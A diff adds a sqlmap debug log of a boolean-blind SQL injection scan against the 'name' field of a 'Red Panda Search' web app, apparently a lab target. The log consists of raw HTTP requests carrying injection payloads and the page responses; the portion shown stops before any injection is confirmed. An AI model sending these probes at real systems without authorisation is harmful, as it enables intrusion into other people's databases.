@@ -1,0 +1,6084 @@
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.6.4#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:50:26 /2022-07-16/
+
+[12:50:26] [DEBUG] cleaning up configuration parameters
+[12:50:26] [DEBUG] setting the HTTP timeout
+[12:50:26] [DEBUG] setting the HTTP User-Agent header
+[12:50:26] [DEBUG] creating HTTP requests opener object
+[12:50:27] [DEBUG] setting the HTTP Referer header to the target URL
+[12:50:27] [INFO] testing connection to the target URL
+[12:50:27] [TRAFFIC OUT] HTTP request [#1]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 12
+Connection: close
+
+name=woodenk
+
+[12:50:27] [DEBUG] declared web page charset 'utf-8'
+[12:50:27] [TRAFFIC IN] HTTP response [#1] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:27 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:27] [INFO] testing if the target URL content is stable
+[12:50:27] [TRAFFIC OUT] HTTP request [#2]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 12
+Connection: close
+
+name=woodenk
+
+[12:50:28] [TRAFFIC IN] HTTP response [#2] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:27 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:28] [INFO] target URL content is stable
+[12:50:28] [INFO] testing if POST parameter 'name' is dynamic
+[12:50:28] [PAYLOAD] 4625
+[12:50:28] [TRAFFIC OUT] HTTP request [#3]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 9
+Connection: close
+
+name=4625
+
+[12:50:28] [TRAFFIC IN] HTTP response [#3] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:27 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: 4625</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:28] [WARNING] POST parameter 'name' does not appear to be dynamic
+[12:50:28] [PAYLOAD] woodenk.((."',,).
+[12:50:28] [TRAFFIC OUT] HTTP request [#4]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 36
+Connection: close
+
+name=woodenk.%28%28.%22%27%2C%2C%29.
+
+[12:50:28] [TRAFFIC IN] HTTP response [#4] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:27 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk.((."',,).</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:28] [WARNING] heuristic (basic) test shows that POST parameter 'name' might not be injectable
+[12:50:28] [PAYLOAD] woodenk'VpvDlA<'">ZsgGCu
+[12:50:28] [TRAFFIC OUT] HTTP request [#5]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 39
+Connection: close
+
+name=woodenk%27VpvDlA%3C%27%22%3EZsgGCu
+
+[12:50:28] [TRAFFIC IN] HTTP response [#5] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:27 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk&#39;VpvDlA&lt;&#39;&quot;&gt;ZsgGCu</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:28] [INFO] testing for SQL injection on POST parameter 'name'
+[12:50:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[12:50:28] [PAYLOAD] woodenk') AND 1351=1197-- hEMo
+[12:50:28] [TRAFFIC OUT] HTTP request [#6]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 47
+Connection: close
+
+name=woodenk%27%29%20AND%201351%3D1197--%20hEMo
+
+[12:50:28] [TRAFFIC IN] HTTP response [#6] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:28 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk') AND 1351=1197-- hEMo</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:28] [WARNING] reflective value(s) found and filtering out
+[12:50:28] [PAYLOAD] woodenk') AND 5913=5913-- eghJ
+[12:50:28] [TRAFFIC OUT] HTTP request [#7]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 47
+Connection: close
+
+name=woodenk%27%29%20AND%205913%3D5913--%20eghJ
+
+[12:50:29] [TRAFFIC IN] HTTP response [#7] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:28 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk') AND 5913=5913-- eghJ</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:29] [PAYLOAD] woodenk' AND 5116=9068-- bZdQ
+[12:50:29] [TRAFFIC OUT] HTTP request [#8]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 44
+Connection: close
+
+name=woodenk%27%20AND%205116%3D9068--%20bZdQ
+
+[12:50:29] [TRAFFIC IN] HTTP response [#8] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:28 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' AND 5116=9068-- bZdQ</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:29] [PAYLOAD] woodenk' AND 5913=5913-- STEf
+[12:50:29] [TRAFFIC OUT] HTTP request [#9]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 44
+Connection: close
+
+name=woodenk%27%20AND%205913%3D5913--%20STEf
+
+[12:50:29] [TRAFFIC IN] HTTP response [#9] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:28 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' AND 5913=5913-- STEf</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:29] [PAYLOAD] woodenk') AND 4764=5767 AND ('mEak'='mEak
+[12:50:29] [TRAFFIC OUT] HTTP request [#10]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 70
+Connection: close
+
+name=woodenk%27%29%20AND%204764%3D5767%20AND%20%28%27mEak%27%3D%27mEak
+
+[12:50:29] [TRAFFIC IN] HTTP response [#10] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:28 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk') AND 4764=5767 AND ('mEak'='mEak</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:29] [PAYLOAD] woodenk') AND 5913=5913 AND ('PsBp'='PsBp
+[12:50:29] [TRAFFIC OUT] HTTP request [#11]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 70
+Connection: close
+
+name=woodenk%27%29%20AND%205913%3D5913%20AND%20%28%27PsBp%27%3D%27PsBp
+
+[12:50:29] [TRAFFIC IN] HTTP response [#11] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:28 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk') AND 5913=5913 AND ('PsBp'='PsBp</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:29] [PAYLOAD] woodenk')) AND 5921=2535 AND (('SAan'='SAan
+[12:50:29] [TRAFFIC OUT] HTTP request [#12]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 76
+Connection: close
+
+name=woodenk%27%29%29%20AND%205921%3D2535%20AND%20%28%28%27SAan%27%3D%27SAan
+
+[12:50:29] [TRAFFIC IN] HTTP response [#12] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:29 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk')) AND 5921=2535 AND (('SAan'='SAan</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:29] [PAYLOAD] woodenk')) AND 5913=5913 AND (('puRa'='puRa
+[12:50:29] [TRAFFIC OUT] HTTP request [#13]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 76
+Connection: close
+
+name=woodenk%27%29%29%20AND%205913%3D5913%20AND%20%28%28%27puRa%27%3D%27puRa
+
+[12:50:30] [TRAFFIC IN] HTTP response [#13] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:29 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk')) AND 5913=5913 AND (('puRa'='puRa</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:30] [PAYLOAD] woodenk'))) AND 8266=2736 AND ((('FvkP'='FvkP
+[12:50:30] [TRAFFIC OUT] HTTP request [#14]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 82
+Connection: close
+
+name=woodenk%27%29%29%29%20AND%208266%3D2736%20AND%20%28%28%28%27FvkP%27%3D%27FvkP
+
+[12:50:30] [TRAFFIC IN] HTTP response [#14] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:29 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk'))) AND 8266=2736 AND ((('FvkP'='FvkP</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:30] [PAYLOAD] woodenk'))) AND 5913=5913 AND ((('JAOj'='JAOj
+[12:50:30] [TRAFFIC OUT] HTTP request [#15]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 82
+Connection: close
+
+name=woodenk%27%29%29%29%20AND%205913%3D5913%20AND%20%28%28%28%27JAOj%27%3D%27JAOj
+
+[12:50:30] [TRAFFIC IN] HTTP response [#15] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:29 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk'))) AND 5913=5913 AND ((('JAOj'='JAOj</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:30] [PAYLOAD] woodenk' AND 3654=9312 AND 'DPLG'='DPLG
+[12:50:30] [TRAFFIC OUT] HTTP request [#16]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 64
+Connection: close
+
+name=woodenk%27%20AND%203654%3D9312%20AND%20%27DPLG%27%3D%27DPLG
+
+[12:50:30] [TRAFFIC IN] HTTP response [#16] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:29 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' AND 3654=9312 AND 'DPLG'='DPLG</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:30] [PAYLOAD] woodenk' AND 5913=5913 AND 'cSCN'='cSCN
+[12:50:30] [TRAFFIC OUT] HTTP request [#17]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 64
+Connection: close
+
+name=woodenk%27%20AND%205913%3D5913%20AND%20%27cSCN%27%3D%27cSCN
+
+[12:50:30] [TRAFFIC IN] HTTP response [#17] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:29 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' AND 5913=5913 AND 'cSCN'='cSCN</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:30] [PAYLOAD] woodenk') AND 3581=3433 AND ('njWn' LIKE 'njWn
+[12:50:30] [TRAFFIC OUT] HTTP request [#18]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 77
+Connection: close
+
+name=woodenk%27%29%20AND%203581%3D3433%20AND%20%28%27njWn%27%20LIKE%20%27njWn
+
+[12:50:31] [TRAFFIC IN] HTTP response [#18] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:30 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk') AND 3581=3433 AND ('njWn' LIKE 'njWn</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:31] [PAYLOAD] woodenk') AND 5913=5913 AND ('ofxz' LIKE 'ofxz
+[12:50:31] [TRAFFIC OUT] HTTP request [#19]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 77
+Connection: close
+
+name=woodenk%27%29%20AND%205913%3D5913%20AND%20%28%27ofxz%27%20LIKE%20%27ofxz
+
+[12:50:31] [TRAFFIC IN] HTTP response [#19] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:30 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk') AND 5913=5913 AND ('ofxz' LIKE 'ofxz</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
